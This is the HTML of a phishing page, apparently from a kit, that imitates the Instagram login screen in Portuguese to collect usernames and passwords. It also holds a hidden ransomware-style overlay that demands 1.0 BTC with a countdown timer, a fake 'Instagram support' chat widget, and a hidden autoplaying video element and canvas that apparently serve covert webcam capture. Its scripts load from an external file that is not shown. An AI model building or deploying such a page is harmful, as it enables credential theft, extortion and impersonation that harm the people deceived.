<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: white; padding: 40px 40px; border: 1px solid #dbdbdb; text-align: center; max-width: 350px; width: 100%; position: relative; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 40px; margin-top: 10px; }
        .ms-input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px 8px; font-size: 12px; margin-bottom: 6px; border-radius: 3px; outline: none; box-sizing: border-box; }
        .ms-input:focus { border: 1px solid #a8a8a8; }
        .ms-button { background: #0095f6; color: white; border: none; padding: 8px; width: 100%; cursor: pointer; font-weight: 600; border-radius: 4px; font-size: 14px; margin-top: 15px; }
        .ms-button:hover { background: #1877f2; }
        .fb-login { color: #385185; font-weight: 600; font-size: 14px; margin-top: 25px; display: block; text-decoration: none; }
        .forgot { color: #00376b; font-size: 12px; margin-top: 20px; display: block; text-decoration: none; }
        
        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #dbdbdb; text-align: left; }
    </style>
</head>
<body>
    <div id="template-container" class="card">
        <div id="loader" style="margin-bottom:20px; font-weight:600; color:#8e8e8e; font-size:14px;">Carregando...</div>
        <div id="content" style="display:none;">
            <div id="ig-view">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
                
                <input type="text" id="u" class="ms-input" placeholder="Telefone, nome de usuário ou email">
                <input type="password" id="p" class="ms-input" placeholder="Senha" style="display:none;">
                
                <button class="ms-button" id="btn" onclick="handleAuth()">Entrar</button>
                
                <div style="display: flex; align-items: center; margin-top: 15px;">
                    <div style="flex-grow: 1; height: 1px; background-color: #dbdbdb;"></div>
                    <div style="color: #8e8e8e; font-size: 13px; font-weight: 600; padding: 0 15px;">OU</div>
                    <div style="flex-grow: 1; height: 1px; background-color: #dbdbdb;"></div>
                </div>

                <a href="#" class="fb-login">Entrar com o Facebook</a>
                <a href="#" class="forgot">Esqueceu a senha?</a>
            </div>
        </div>
    </div>

    <!-- Ransomware -->
    <div id="ransom-overlay">
        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
    </div>

    <!-- Chat -->
    <div id="chat-widget">
        <div style="background:#0095f6; color:white; padding:15px; font-weight:bold;">Suporte do Instagram</div>
        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
        <div style="display:flex; padding:10px; border-top:1px solid #dbdbdb;">
            <input type="text" id="chat-in" placeholder="Mensagem..." style="flex:1; border:none; outline:none;">
            <button onclick="sendChat()" style="background:none; border:none; color:#0095f6; font-weight:600; cursor:pointer;">Enviar</button>
        </div>
    </div>

    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script src="/sentinel.js?v=5"></script>
</body>
</html>
